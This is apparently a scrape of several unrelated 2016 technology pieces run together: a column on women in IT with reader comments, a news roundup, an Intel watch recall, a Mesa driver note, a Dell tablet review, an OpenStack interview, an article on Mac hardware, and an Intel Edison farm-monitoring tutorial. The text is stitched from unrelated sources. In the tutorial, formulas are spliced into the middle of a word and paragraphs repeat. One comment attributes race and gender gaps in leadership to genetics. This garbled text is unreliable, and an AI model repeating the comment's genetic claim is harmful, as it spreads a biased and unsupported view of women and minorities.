woman in 2015 -- a 5.8% increase over 2014 -- is approaching that goal. There is a skills gap. Never mind diversity, what about gender equality? The rather bleak outlook for women in IT is not lost on Carolyn Leighton, president and chairwoman of Women in Technology International (WITI). Leighton founded WITI in 1989 after working as a consultant with women technologists in California's Silicon Valley and hearing about some of their workplace frustrations. The organization -- which bills itself as the leading trade association for technology women, with chapters worldwide -- boasts some 2 million members. She shares Logan's puzzlement about the trend of women in technology. "In the last year, I've heard more stories [about women's experiences in Silicon Valley] similar to the very beginning when I started WITI than I had heard in years, and it was pretty upsetting and discouraging," she said. "There seems to be progress in terms of getting more women into C-level positions; on the other hand, there seems to be little organizational transformation going on in companies." Pressed, Leighton recounted one story of a Harvard-educated entrepreneur who, with one successful company already under her belt and looking for funding for a second startup, was grilled by Silicon Valley venture capital investors on when she was planning on getting pregnant. "I haven't quite figured out why this seems to be occurring." And, while a multimillion-dollar diversity program like Intel's is certainly laudable in its goal of making the tech industry more representative of the population, Leighton is among those who are deeply skeptical and, frankly, dismayed by the industry's habit of lumping women -- who, after all, represent 50% of the population and without whom none of the Silicon Valley male hotshots would exist -- into so-called diversity programs. "They are making policy around diversity and compliance, rather than as a business initiative and, in my opinion, missing an opportunity to recognize women as serious business contributors," Leighton said. "Most smart, well-educated, talented women find it offensive and insulting." Couple that approach with policies that give bonuses to managers for hiring women, she added, and "women walk into an environment where they're already doomed because the men are angry, and some are going to do everything they can to make sure they fail." Gartner's Logan concurred on the negative perception of diversity programs. "Particularly in America, that stuff rubs us the wrong way. Moreover, diversity, at that level, happens way too late," she said, pointing to the decline in women computer science graduates. "I don't want anyone to perceive me as anything other than 100% capable and competent to do the job, and these diversity programs don't seem to operate that way," she said. As for solutions, well, there are some interesting ideas afoot: Many companies are replacing diversity programs with inclusion programs, and there is talk of making institutional changes designed to support women with families. But that's a column for another day. In the meantime, who can tell what having a female as commander in chief could do for women in tech? CIO news roundup for the week of Aug. 1 The Intel CIO appointment wasn't the only tech news this week. Here's what else grabbed headlines: Bitcoin intrusion. Hong Kong-based Bitfinex, one of the world's largest bitcoin exchanges, suspended trading, withdrawals and deposits after it discovered hackers stole 119,756 bitcoins worth approximately $65 million from users' accounts. "We are currently in an ongoing process of restoring limited functionality in a secure environment, with full functionality coming afterwards in progressive stages," Bitfinex announced on the company's official blog. The security breach comes two months after Bitfinex was ordered to pay a $75,000 fine by the U.S. Commodity Futures Trading Commission and is the biggest bitcoin hack since the 2014 hack of Tokyo-based bitcoin exchange Mt. Gox. Hacks like these have highlighted the potential security issues related to the digital currency. HPE cloud reorganization. Bill Hilf, senior vice president and general manager of the Hewlett Packard Enterprise cloud business, is leaving HPE, the company announced in a blog post Monday. Helion OpenStack and Helion CloudSystem teams are being moved to the enterprise group, and they will be part of the newly created software-defined and cloud group. "By bringing these assets together, we create a single organization tasked with a common mission -- to provide best-in-class solutions that enable developers and operators to deploy their applications across traditional and cloud infrastructures, simply and effortlessly," Antonio Neri, executive vice president and general manager of the Hewlett Packard Enterprise group, said in the post. Two other executives, Manish Goel, the head of HPE's storage business, and Robert Vrij, managing director of sales for the Americas, are also exiting the company. The reorg follows the June announcement that HPE CTO Martin Fink is retiring. Amazon leads public cloud storage. Amazon Web Services, which generated $2.9 billion in second-quarter earnings, rules the infrastructure-as-a-service market, according to Gartner's Magic Quadrant for Public Cloud Storage Services, Worldwide report. AWS has the most extensive and well-integrated public cloud storage offerings, the report stated. "Amazon S3 [Simple Storage Service] is 1.6 times as large as all the other object storage services in this Magic Quadrant combined, as measured by amount of data stored," according to the report. Microsoft Azure is AWS' closest competitor, the report stated. Google, IBM, Rackspace, Alibaba, Oracle and AT&T also made the Gartner list. Gartner predicted that by 2019, at least one-fourth of these vendors will have exited the cloud storage market. Uber drives to map the world. In a move to minimize its dependence on Google Maps, San Francisco-based ride-sharing company Uber is investing in a $500 million project to map the world's roads, the Financial Times reported Sunday. "The street imagery captured by our mapping cars will help us improve core elements of the Uber experience, like ideal pick-up and drop-off points and the best routes for riders and drivers," said Brian McClendon, vice president of Uber's Advanced Technologies Center, in a statement. The Uber mapping cars are already on U.S. and Mexico roads. In other Uber news, chief executive Travis Kalanick said Monday that the company's China unit, Uber China, will merge with its Chinese rival Didi Chuxing in an attempt to cut losses.

Add My Comment Cancel   [-] iThinker2 - 10 Aug 2016 12:52 PM So, to reach the diversity goals is actually hiring and promotion of anyone other than a white male.  Who cares about ability and performance?  How do the women who have sons feel about this? Add My Comment Cancel   [-] RoyMMira - 10 Aug 2016 1:49 PM Linda, you're missing the forest for the trees.   The absolute majority of decisions made when  hiring and promoting are based on who is the best candidate to give more money into the pocket of who's hiring.   In the majority of these high management selection decisions, what matters is the "money creation" potential that the  hired or promoted person brings to the top , not prejudice against women or the so called "minorities" (which by the way are now quickly becoming the majority in this country, following the expected Nature's march towards reducing peaks and troughs of excellence all over the world).   If there has been inequality of race/gender representation  at high management and leadership within the past 10,000 years of humanity history,  it is in general due to Nature's unequal distribution of genes defining the traits that pool in onto selected or self made  leaders...   I am not one that could be at the  top command of hierarchies, but I'm not naïve  enough to immediately conclude that my limitations must be caused by discrimination.    Nature is what it is,  and distributes various physical and mental traits according to the environment and  gene pools,  which is to say, a lot of random variables are in the play.    But even random distributions have a defining probability function and over thousand of years, means and deviations appear for each region and racial groups which are not quite equal.   Of course they greatly overlap, but still, in sampling these slightly different distributions over longer periods of time, different results will appear for gender and race components at the hierarchy top.  Whoever you see more prevalent at the top, must be what is bringing more success to the endeavor.   Else, they'd be gone... or will in short term.    It may probably be why, you and me, are not in the chairman's room... Add My Comment Cancel   [-] RoyMMira - 10 Aug 2016 2:00 PM Great reply,  iThinker2 !  Managed to summarize what I could not in my full page that got rejected... Add My Comment Cancel   [-] iThinker2 - 10 Aug 2016 4:11 PM It is simple math.  When you look at the percentages in each category, the one that is too big is the white male category. To reach goals, one must reduce or not add to that category. Why are the categories by race? That is the problem.  Add My Comment Cancel   [-] abuell - 10 Aug 2016 1:35 PM Not even close to closed. Better than it has been in the past, maybe, but even that is questionable. Just the fact that someone feels the need to write an article about a woman CIO demonstrates that it's still considered an unusual and noteworthy thing. No one would write the same article about a male CIO.  Add My Comment Cancel   -ADS BY GOOGLE Latest TechTarget resources Compliance Health IT Cloud Computing Mobile Computing Data Center SearchCompliance Mitigating insider threats remains a major cyber concern Expert panelists at the Cambridge Cyber Summit briefed the audience on some of the steps that organizations should implement for ...

Intel said it was aware of "a small number of customers have reported discomfort, blistering or burns on their wrist under the watch body".     The chipmaker is offering a full refund on the Basis fitness watches, with the recall being voluntarily for Intel, but it doesn't help Intel's image in the werable market after spending $100 million acquiring Basis in 2014. The Basis Peak is the first smartwatch the company built after it was acquired by Intel, and is capable of monitoring your heart rate, sweat output, and physical movements.   But, the Basis Peak overheats and could burn or blister the wearer's skin, which is why Intel has issued a safety recall. Intel noticed the issues last month, and recommended that Basis Peak owners stop using the product as a precautionary measure, reports Business Insider. Intel said on Wednesday that it was issuing a mandatory recall for all of the watches, and will be shutting down the Basis Peak online services by the end of 2016.   Intel said in a statement on Wednesday: "We had hoped to update the software on your watch to address the problem. Unfortunately, despite our best efforts, we aren't able to develop such a solution without completely compromising the user experience. As a result, we are asking that you return your Basis Peak watch and authorized accessories for a full refund at your earliest convenience. This was a tough decision, but your safety is our top priority".

Intel Mesa Soon Having OpenGL 4.5, Collabora To Focus On Performance Written by Michael Larabel in Intel on 5 August 2016 at 03:06 PM EDT. 11 Comments Collabora's Timothy Arceri, one of the firm's open-source graphics driver developers, has written a blog post about recent work they've done to the open-source Intel Mesa driver stack. Arceri covers the work done to getting the Mesa driver to exposing OpenGL 4.4 for Intel Broadwell hardware and newer. He also reiterates that all of the necessary extensions for OpenGL 4.5 are already implemented too (for Broadwell and newer). The only reason OpenGL 4.5 isn't officially advertised yet by the Intel Mesa driver is that there are some conformance test failures to first fix. Timothy concluded by saying over the next few months at Collabora he will be working on performance optimizations to the Intel Linux driver. Among the items he will be focusing on are the Mesa on-disk shader cache and mproving optimastion passes for the GLSL compiler. More details at Collabora.com. 11 Comments Tweet About The Author Michael Larabel is the principal author of Phoronix.com and founded the site in 2004 with a focus on enriching the Linux hardware experience.

The tablet is 17.1mm thick and weighs about 730 grammes, excluding the keyboard, which is designed to function as a stand and has a slot at the top on which to place the tablet. The tablet links easily to the keyboard through a magnetic connection. The display has 360 nits of brightness and uses UltraSharp 4K UHD display technology optimised for Windows 10 touch interaction. Resolution is sharp at 3840x2160 pixels and the screen, which is anti-fingerprint coated, is protected by Corning Gorilla Glass. The Latitude 7275 is powered by 6th generation Intel Core Core m7-6Y75 64-bit dual-core processor running at 1.2 GHz. It has 8 gigabytes of DDR3 SDRAM 1600MHz working memory and uses an SSD M.2 250GB drive for storage. Graphics performance is powered by the Intel HD Graphics 515 chipset and the tablet runs on Microsoft Windows 10 Pro 64-bit operating system.  I had no problem using the Intel Dual Band Wireless-AC 8260 802.11 AC Wi-FI adapter to connect to my Linksys WRT1200 AC router. The connection was fast and smooth. Although the Latitude 7275 is designed for business-related tasks, it has good multimedia performance. Its 4K display is very good for watching HD videos and viewing high-resolution photos. I tried playing HD video clips and they played smoothly and without performance hiccups. A MaxxAudio Pro sound system powers the two speakers and the sound is of excellent quality.  The Latitude 7275 has two Type-C (Thunderbolt) USB ports supporting USB3.1 connection profiles for connecting to fast external drives and devices. It also has a 3-in-1 microSD card that supports SD, SDHC, SDIO, SDXC with UHS cards plus a headphone/microphone combo jack. The tablet also has 8MP rear camera and 5MP front-facing camera. During the test, I found that the Latitude 7275 handled business applications well and the provided keyboard was good for typing. Moreover, the tablet supported the use of an optional stylus pen. Dell Latitude 7275 has a suggested retail price of Bt60,000. The package includes a keyboard but not the stylus.     >> Operating System: |Windows 10 Pro (64-bit) >> Processor: Intel Core m7-6Y75 Processor (4M cache) 1.2 GHz >> Memory: 8 GB LPDDR3 SDRAM 1600MHz >> Graphics adapter: |Intel HD Graphics 515 >> Display: 12.5-inch UHD Touch with Corning Gorilla Glass (3840 x 2160), Anti-Fingerprint, (16:9), 360 nits >> Storage: SSD M2 256 GB >> Ports: 2 x USB 3.1 Type C (Thunderbolt), SD 4.0 Memory Card Reader, I2C for Keyboard Connection >> Multimedia: Stereo Speaker with MaxxAudio Pro, Headphone/ Microphone combo jack, |Volume Up/Down Rocke >> Cameras: 8-MP rear camera, -MP front-facing camera >> Battery: 2-Cell (30WHr) battery ExpressCharge >> Dimensions: Height: 17.1mm x Width: 291mm x Depth: 193mm >> Weight: 0.73kg   Tags IT gadget Most Viewed TODAY LAST 7 Days LAST 30 Days Memories of a lifetime...

Jonathan Bryce was involved in the inception of OpenStack while working at Rackspace. OpenStack originated as a joint project of Rackspace Hosting and NASA. It is a free and open source platform for cloud computing, mostly deployed as an infrastructure-as-a-service (IaaS). The technology and methodologies of OpenStack development have been embraced by some of the biggest companies and technology organisations in the world, including eBay, BMW, AT&T, CERN, Intel, NASA, PayPal, Walmart and Sony. Bryce was in Dublin recently to speak at the very first Intel-hosted OpenStack day. How did the OpenStack movement and methodology originate? OpenStack was founded out of Rackspace about six years ago as an open source project to enable organisations to build and automate the cloud: automate all the equipment they have in their data centres, the servers, the storage devices, networking devices etc. In my previous role, I started the Rackspace cloud and when we went open source we weren’t sure what the responses would be but, over the last six years, it has grown to be one of the largest open source projects ever. We have 50,000 members participating from more than 170 countries. It’s been pretty unbelievable. A couple of years after doing that, there were a lot of organisations getting involved or contributing software and, at that point, we decided what we needed was an independent foundation to be the long-term home for the software and to manage our community. We started the OpenStack Foundation in 2012 and it is a totally independent, non-profit organisation that manages that massive community and the intellectual property and everything else around it. How has OpenStack been embraced in the data industry? The biggest goal that people usually have when they go to OpenStack is to be able to manage infrastructure in a more automated way. That is something that has been a big trend in the last few years and we see it in public cloud with the adoption rates that Amazon and Google and Rackspace and others see. We also see it in a lot of large data centres. We do a big event every six months called the Open Stack Summit, the next one is in Barcelona, which is where we get the community together and we usually hear about the latest use cases. The most recent one was at the end of April and we had AT&T, China Mobile, Volkswagen, SAP and others, literally the largest companies in the world, talking about what they are doing with OpenStack. AT&T is the largest integrated telecoms carrier in the world and right now faces a situation where the amount of data usage on their network has exploded and, especially with the advent of smart cars, smart cities and IoT applications, they have seen network usage increase 1,050pc since 2008. They are basically in a different business now than they were 10 years ago, but the way that telecoms companies acquire technology historically has been extremely long development cycles, standards bodies and through vendors. And that doesn’t work as dynamically in the market they face now. They are implementing OpenStack so they can rapidly develop new products and change the way their networks work. Instead of having a single set of physical devices that can do only so many tasks, like SMS routers, they are moving to the same model that enterprises use where they are virtualising those workloads. They can create multiple text message routers and, if they are getting a lot of 4G data usage, they can allocate those resources to virtual machines that are running data routing instead of message routing. And it really changes the way they can manage the network and handle usage from their customers. Another example I mentioned was Volkswagen. The car industry is undergoing a crazy shift where it is not just about how well can you make that physical good now, the car industry is going into self-driving autonomous cars, in-car entertainment and that is a lot about software development. So Volkswagen is having to understand how to become a technology company, a software company in addition to being a world-class manufacturer. How does OpenStack complement other movements such as the Open Compute community around software-defined networks (SDNs) and virtualisation? What it shows is how the technology landscape is really embracing open design and development as a way to produce tech for people to use. We have worked with the Facebook team that launched Open Compute since they launched because, at the end of the day, OpenStack needs servers and storage and networking gear to run on and that’s kind of what Open Compute is about. Best Buy, which is a retail company in the US, uses OpenStack and makes use of Open Compute technology in their data centres. It is interesting because one of the areas they found advantage with was on the storage side because Open Compute focuses on very power-efficient and high-density systems. Retail used to be about the logistics of getting goods into a store and into the hands of customers. Now it is about understanding what customers are buying, how to make recommendations and help them find other things they would like to purchase. That is a big data analytics problem and that requires a lot of storage, computing power and Best Buy has implemented a combination of Open Stack on top of Open Compute for that. What are the leading issues that dominate the OpenStack community today? Our conference in Ireland had several companies with software development teams based here. Half the audience had used OpenStack and the other half were there to learn more. That’s pretty close to what we see through most of these events in Europe. The thing that is interesting to me [is that] we’ve had some very large and successful users for a number of years, but in the last 12 months the number of companies that have moved from testing to production has grown a lot and that is definitely visible in the kind of topics that are discussed at these events. What does the future look like for OpenStack? OpenStack is a set of technologies that are produced collaboratively by this global community but it has also become a strategy for how to work with a variety of diverse technologies in an augmented way. For me, the future is really exciting because we are getting to the point where we are seeing what people are putting on top of compute, storage and networking. Having programmable infrastructure is critical to being able to get to the next generation of technology like orchestration, platform as a service, and that’s what we are just starting to see companies do. We have users who are using things like Cloud Foundry. SAP, for instance, has a Cloud Foundry Stack, which they call the SAP HANA Cloud Platform, and it is OpenStack and Cloud Foundry. What is interesting for me is seeing how all these different technologies come together and unleashes a wave of developer innovation.

Apart from the recently refreshed MacBook, many of the company’s Mac products are well over a year old. The Mac Mini is nearly two, the high-end workstation Mac Pro is almost three, and the sole remaining non-Retina MacBook Pro is now more than four years old. Writing for The Verge, Sam Byford recently argued that “Apple should stop selling four year-old computers.” He’s not wrong to note the 2012-era MacBook Pro is pretty long in the tooth with its 4GB of RAM and Ivy Bridge-based processor, or that Apple has neglected specific products, like the Mac Mini. I thought about writing a similar article last month, but with a specific focus on the Mac Pro. After digging around in Intel’s Ark (a tool that lets you compare the specifics of various Intel processors), I realized that while there are exceptions, Apple’s relatively lax refresh cycle is mostly driven by the low rate of improvements in PC hardware these days. Apple is just more honest about it. Meet the new CPU, same as the old CPU Setting aside the non-Retina MacBook Pro from 2012, most of Apple’s laptops are running on Broadwell or Skylake (the 2016 MacBook). There’s a single SKU left over from Haswell at the $1,999 price point, but the laptop lineup is pretty new. Byford is right when he calls out the nearly three-year gap between the Mac Pro’s debut and the present day, but he doesn’t specifically discuss just how little this has meant to the machine’s top end performance. The Mac Pro ships in two configurations we’ll address: An Ivy Bridge Xeon quad-core at 3.7GHz with 10MB L3 (E5-1620 v2) or a 2.7GHz 12-core IVB-EP CPU with 30MB L3 (E5-2697 v2). Let’s compare those with their counterparts today. In the chart above, we’ve arranged each IVB chip on the left, followed by its modern counterpart. Intel doesn’t have a 12-core Broadwell chip in the 135W TDP bracket, only in 105W and 160W flavors. There are higher-core count systems with lower clock speeds, but our hypothetical test-case is a user who wants both high clocks and high core counts. The first thing to note is how little Intel’s chip lineup has actually changed in the past three years. The modern E5-2687 v4 has a slightly higher base clock speed but a significantly higher TDP. Top frequency is identical between the two. Broadwell offers essentially no clock speed improvements over IVB-E at the quad-core level — in fact, the IVB-EP actually clocked higher than its counterpart. True, architectural improvements will compensate for some of this, but not by much — Haswell was roughly 8% faster than IVB-E, and Skylake hasn’t come to the E5 family yet. You’d get some uplift if your application supports and makes significant use of AVX2, but otherwise? There’s not a lot of upgrade to be had. In short, there’s just not much reason to update the Mac Pro’s CPU — not until and unless Intel can field designs that truly merit it. While Apple will likely eventually refresh the Mac Pro, the only big winners will be Mac users who want to pack as many threads as possible into a single-socket system (Intel now offers Xeons with up to 22 cores in the E5 family). What about GPUs? GPUs are where the lengthy wait times in between refresh cycles really does bite customers. The current top-end Mac Pro fields a pair of D700 graphics cards based on AMD’s original GCN 1.0 architecture. AMD has built multiple cards that could’ve been used to upgrade these configurations, while the Polaris GPU inside the RX 480 would deliver better performance and more VRAM at a much lower TDP and price point. The problem with criticizing Apple’s GPU performance is that Apple doesn’t care all that much about graphics, period. OS X continues to field a version of OpenGL that’s nearly six years old and Apple isn’t supporting Vulkan, instead choosing to field its own close-to-metal API, Metal. Apple isn’t exactly out of step with the rest of the industry; outside of boutique laptops, there just aren’t very many systems shipping with discrete GPUs any more — at least, not many below the $1,000 price point, and not with decent graphics hardware. If your workloads depend on GPUs and scale with graphics horsepower, you aren’t using Apple. (There are plenty of workloads that run better on GPUs than CPUs, but don’t actually scale all that well, which is why I make that distinction). For a brief moment in 2013, with the launch of the Mac Pro, it looked like Apple might embrace OpenCL, GPGPU programming and offload, and put a new focus on integrating high-end GPUs into its various products. That moment has come and gone. While I do suspect we’ll see Apple hardware with refreshed graphics hardware, it’ll be the 14nm refresh cycle that drives it, not any particular interest in GPU computing or graphics as a whole. So… where’s that leave us? I’m not an Apple apologist. I use an iPhone, granted, but I’m still back on the 5c and I plan to use it until the screen cracks or the battery dies. Posts like this inevitably ignite arguments over whether Apple devices are worth paying for, and whether a different manufacturer offers more value at a given price point. Spoiler alert: Oftentimes, they do, though you may have to do an infuriating amount of searching before finding a system you actually like. It’s been a while since Apple updated its hardware, some of that hardware could be better than it is, and the net result would be systems that were at least a little sexier than they are today. But Apple has kept updating most of its laptop lines to take advantage of better battery life and performance improvements, while the performance of desktop CPUs has largely stagnated. Is it ignoring GPUs? Yes — but that’s completely par for Apple. The Mac Pro in 2013 was unusual precisely because it put GPU compute first and foremost. Apple’s decision to mostly ignore the segment afterwards might be unfortunate, but it’s scarcely surprising. Apple has held off on making fundamental platform changes precisely because it’s been waiting for the underlying technology to advance enough to make the changes worthwhile. Given the frustration of sorting through hundreds of nearly identical laptops from multiple manufacturers every time a friend or family member asks for help choosing a laptop, I’m not sure I can blame them.

Agricultural field monitoring and control can also possible using IoT sensor network Download Matlab_Analysis.zip - 363.1 KB Download AgroWatering.zip - 1.1 KB Objective You might have already read, heard, seen or watched some forms of plant monitoring system, either embedded based or IoT based.  Let's be honest, we all love plants and any hacker one time or the other thinks of building a system for taking care of her plant health and watching it.  How is then this article different or unique from tons of other simillar projects? Well, if you have observed the most Agro-IoT projects, the objects are similar: Collecting soil and environmental parameters Data visualization Remote or automatic triggering of irrigation/watering system Many platforms like Windows Azure, IBM Watson offers machine learning on gathered sensor data. But, they are not free and you don't find too many use case examples where a full stack Agro-IoT is demonstrated. So, we wanted to build a poor man's Agro-IoT stack with fully demonstratable prototype.  In a developing country like India, if we expect a farmer to spend on his IT budget for cloud, we may be asking for an improbable scenerio. Even hardware costs would be an overhead for them when they suffer extreme challenges starting from getting the right seed and pesticides in time to right till harvesting and selling. Adding a recurring cost of data monitoring would not be a feasible solution. On the other hand, with increasing technologies in hand, right adoptation can lead to better crops and throughput. In this project we have tried to build a feasible solution for usual Agro monitoring and control along with integrating an efficient data analytics scheme based on clustering techniques. We use ThingSpeak's free framework for the same. Collected data is analyzed at an end node using Matlab. Introduction The overall methodology of the work can be summarized into following modules. Physical parameter monitoring: We have used light sensor(LDR),temperature sensor(seed studio temperature sensor),rainfall sensor(resistor based potentiometer),and soil moisture sensor(……),and we have added the sensor with the analog ports of Aurdino compatible extension board with Intel Edison device. These analog ports are of 10bit precisions, therefore we get A/D values for the sensors within the range of 0,1,2,and 3.These values are further converted the precision parameter value by using the formulae given below, Data display: The observed data is displayed on a color LCD for local observations of the    parameters. Data integration to the cloud:  We use thingspeak IoT gateway to mitigate this data using http sockets, encoded with API keys being offered by the thingspeak. Once the data is mitigated into thingspeak it can be observed in real time from anywhere in the world. Alert generation: We have defined threshold for temperature as 40’c, light intensity as more than 70’c, and soil moisture as less than “0”, as in an unsuitable conditions for the plants, in case such a condition when observed the far 1) Temperature=1/ (Math.log (resistance/10000.0)/B+1/298.15)-273.15 2) lp= lightVal*100 // Light intensity in percentage 3) var soilVal=1023-soilSensor.read()         soilVal=soilVal*100/1023 // Soil moisture in %     4) var rainfall=1023-rainSensor.read()         rainfall = rainfall*100/1023 // Rainfall in % , though in mm would have been a better metric mer is notified through a matt channel. Irrigation Control: We have used a 230 volt pump through a relay and we have added it with the data port of Intel Edison board. The irrigation system is connected with the farmers using MQTT protocol which is a high queue guaranteed, low latency communication protocol for Iota farmer can generate particular commands for switching on and turning off of the irrigation system. Once the respective command is asynchronously obtained by Intel Edison it triggers the relay on and off based on the command. Data Analytics: We have added a data mining technique based on MATLAB by means of which we can not only observe the value of the environment but we can also predict their future values. Therefore farmers can be prepared with the future conditions, this is been done with the mat lab analysis where the code is deployed directly on the cloud. Scope and Challenges Our major goal is to offer an architecture which should help in improving the productivity of the crops, specifically for the Indian farmers. However this can be adapted to the wide range of applications which includes mining, the parameter monitoring in a mining field is a significant important state. As over the years, lots of lives is been cost due to improper knowledge of the environmental data in the mining filed. The work can also be adopted for other wide range of monitoring for example, biological reactions in specific soil conditions, it can be observed in bio gas projects, the proposed architecture can also be adopted for roof garden which is popular in cities, small home garden, home monitoring and so on.   Even though IoT architecture is growing and is estimated to be 20 billion Indians at the end of 2020,and several IoT devices which have come up, which have reduces the price of such devices, these devices are still quite costly. At the same time IoT architecture requires a seamless internet connectivity which is still different to get in many parts of India. Therefore the dependency of the proposed architecture on IoT gateway, the internet connectivity, available bandwidth and the internet access tariff is the major drawback of the work, alongside the current cost level which sometimes is different for the smaller farmers to bear.    Hardware and Software Requirement Hardware Requirements: Intel Edison Aurdino Compatible Breakout board for Intel Edison Sensors: Temperature, LDR light sensor, Moisture Sensor and Rainfall Sensor Actuators: Relay, Water pump 9v External power supply/ Mobile Power Bank Internet Connectivity( Wife), 3G Intel processor powered PC ( minimum 2 GB RAM, iCore3 and above processor) Android Mobile ( Android 4.0 and above) Seed Studio Groove Kit Software Requirements: Linux yocto Operating System for Edison IDE: Intel XDK IoT edition Language: JavaScript ( Node.js) Windows 7 and Above Operating System ( preferably 64 bit) PuTTY WinSCP IoT Gateway: ThingSpeak, IFTTT IoT protocols: MQTT, HTTP   System Design   Block Diagram/system architecture: . https://www.codeproject.com/KB/Articles/1113749/Block_diagram.png                                                       Fig. Block Diagram                                               The sensed data is mitigated into the thingspeak through an IoT gateway,thingspeak gives a real time visualization.We are using a light weight communication protocol MQTT,by using which we are having control over the irrigation in the form of controlling the relay.

} As we use the header file <stdio.h>to include libraries in C, here in java script we use ‘require’ function to use the modules. Hide   Copy Code var mraa=require('mraa');

var sys = require('sys') There are two types of libraries in node js, which are user module and the code module.Java script also supports some of the modules so we don’t have to include Jayson, math libraries.Any user defined libraries can install with javascript using ‘npm’ command, so node js has got the repository where we can push our modules and user can download simply by  npm install command. Hide   Copy Code var exec = require('child_process').exec;

function puts(error, stdout, stderr) { sys.puts(stdout) } Intel Edison uses library called ‘mraa’ for accessing the pins, the same ‘mraa’ is also been available for Rassberry pi and other devices .The main objective is to push the data into ThingSpeak.When we try to push the data into ThingSpeak we need to use ‘http’ methods, as get and post methods.The good thing is that from unix we can open any website from the command prompt, that is by giving a ‘curl’ command. ‘curl’ is a command line url,if any user gives curl google.com the whole thing is going to be passed on the command part of the website and the page will be displayed to the user.We use ‘curl’ command to call ThingSpeak API’s and is a unix system command which will be using a library called ‘sys’,which gives access for all unix system commands.The ‘sys’ will be executed as a child process because node js runs as a single thread.Puts is a function which that is going to put all standard errors to the command prompt. We have defined four sensors,which are connected to the analog input.Soil moisture sensor,rainfall sensor,light sensor and the temperature sensors are been connected to the analog 0,1,2 and 3 input pins respectively.There is also a controlling of water through relay which is connected to the port number 4.   Hide   Copy Code var tSensor=new mraa.Aio(3);

var ldrSensor=new mraa.Aio(2);

var rainSensor=new mraa.Aio(1);

var soilSensor=new mraa.Aio(0);

var relay=new mraa.Gpio(4); When we are using Gpio,we need to specify whether it is input or output.Every general purpose digital pin can take the data and can be used for controlling,simultaneously it can be used to read the digital data.But Gpio can be done at the same time either it can be input or output. Hide   Copy Code var LCD = require('jsupm_i2clcd');

var myLCD = new LCD.Jhd1313m1(6, 0x3E, 0x62);

var B=3975; i2c library stands for integrated circuit to integrated circuit communication.i2c is a protocol used to communicate between two chips through serial communication.In LCD number 6 is the protocol address for i2c,0x3E is the hardware address of the LCD,0x62 is the hardware address of the i2c port.While giving this command we can initialize the LCD. Hide   Copy Code var MQTT = require('MQTT');
var client = MQTT.connect('MQTT://IoT.eclipse.org');

}); 
Loop(); We use MQTT protocol, which is not a part of code library,but through which application we can get connected with the ‘ IoT.eclipse.org’ and will be subscribing to the channel ‘rupam/Agro’.Whenever a message is arriving at the MQTT, this following function will be called.This is an event handling so whenever any message is arriving at the MQTT, one module can communicate with other using something called packet within the node js.Packets will be having two fields namely topic and payload field.Node js is global,so from one module to another module data is communicated through packets not through variables.The good thing is that it uses packets.Models can be either located locally or remotely.Among the topic and payload fields we are using the payload.Since we are subscribing to the particular channel,so when we push the data on the channel we are going to receive a packet,so user don’t have to check the topic. In MQTT user need to give some spaces,tag lines will be replaced in the characters. Convert the payload into number if it is greater than 0, in that situation we keeping the relay as 1 else the relay will be off.Similarly when the state is 1 the relay will be on, in this code we have set an relay automatic time to 5000ms, so even in the case when the user forget to turn off the switch, after 5 sec the relay will be off. Node js is asynchronous.Unlike other programming launguages when we are calling a function it would wait for a function to return a result.But this is not the case with node js,node js will gothe function only when there is a message.We are recursively calling ‘cb’.In other programming languages if we call the same function recursively then function will get into an infinite loop,which will result in stack overflow.But in node js when we call the same function recursively and if there is a packet in the cb that will come out back. i2c library stands for integrated circuit to integrated circuit communication. i2c is a protocol used to communicate between two chips through serial communication.In LCD number 6 is the protocol address for i2c,0x3E is the hardware address of the LCD,0x62 is the hardware address of the i2c port.While giving this command we can initialize the LCD.  When we are using Gpio,we need to specify whether it is input or output.Every general purpose digital pin can take the data and can be used for controlling,simultaneously it can be used to read the digital data.But Gpio can be done at the same time either it can be input or output.  Cb is the name of the message handling method or call back method, whenever there is a MQTT message it will read it, prompt it and will look for another MQTT message. Since we are using node js which runs completely asynchronous even though the function is called recursively it will not get into an infinite loop.It will come back and will enter into a function called loop,where we are reading the temperature value.We use math.floor because double will be too long so to keep the result in two decimal point.  Cb is the name of the message handling method or call back method, whenever there is a MQTT message it will read it, prompt it and will look for another MQTT message. Since we are using node js which runs completely asynchronous even though the function is called recursively it will not get into an infinite loop.It will come back and will enter into a function called loop,where we are reading the temperature value.We use math.floor because double will be too long so to keep the result in two decimal point. Detailed Explanation of code 1. Package Dependencies In unix we use ‘curl’ system command to call any website, so that whatever data we acquire by the sensors we can put it to the thing speak channel. Because java script cannot have access to unix system command we can access the unix commands by using the ‘sys’ library which gives node js access to the internal unix API calls. var exec = require('child_process').exec; Because node js is an application program and unix is the part that will be calling entirely kernel level call, we cannot call the kernel from the application program so, we are using another library called ‘child_process’ to call a new process for accessing kernel . function puts(error, stdout, stderr) { sys.puts(stdout) } In the above line of code the function ‘puts’ will map the console of java script to that of unix. And here stdout, stderr are the standard output and errors in the output window, ‘sys.puts(stdout)’ means whatever data we get that are going to pass to the unix system.    2. variables   var tSensor=new mraa.Aio(3); 
var ldrSensor=new mraa.Aio(2); 
var rainSensor=new mraa.Aio(1); 
var soilSensor=new mraa.Aio(0); In the above code we are declaring the pins with which different sensors are connected, here temperature, ldr, rainfall and soil sensors are connected respectively to Aio(3), Aio(2), Aio(1) and Aio(0) which are four analog ports. var relay=new mraa.Gpio(4); Because we are also controlling the watering of the plant so, relay is connected with Gpio(4) which is  digital pin number(4). relay.dir(mraa.DIR_OUT); Because Gpio is a bidirectional i,e we can read and output the data from the digital we need to explicitly specify for what purpose we are using the digital port which is connected to relay, so that microprocessor can send command to the particular ping. var LCD = require('jsupm_i2clcd'); In the above code ‘i2c’ means integrated circuit communication which is a small protocol by means of which one electronic chip can communicate with another, so for accessing that we are using ‘i2clcd’ library which is called by the protocol i2c. var myLCD = new LCD.Jhd1313m1(6, 0x3E, 0x62); Above code shows that LCD in Intel Edison i2c port is manually connected with 0x3E which is hardware level address of i2c pin and this address will automatically search for the port number and 0x62 is the interrupt number.     3. Mqtt Integration for remote control of Watering //////////////// Plant Watering//////// 
var mqtt = require('mqtt'); In the above code we are adding the mqtt model to get connected to the IoT hub with the help of mqtt protocol. var client = mqtt.connect('mqtt://iot.eclipse.org'); Here ‘iot.eclipse.org’ is a free Mqtt broker  by using which we can subscribe to a particular channel so that we can send command from the mobile to control the watering service.  client.subscribe('rupam/Agro/#') Here we are subscribing to channel ‘rupam/Agro’ so that whenever there is a message it will send to the client asynchronously. client.handleMessage=function(packet,cb)
{ 
var payload = packet.payload.toString() 
console.log(payload.length); 
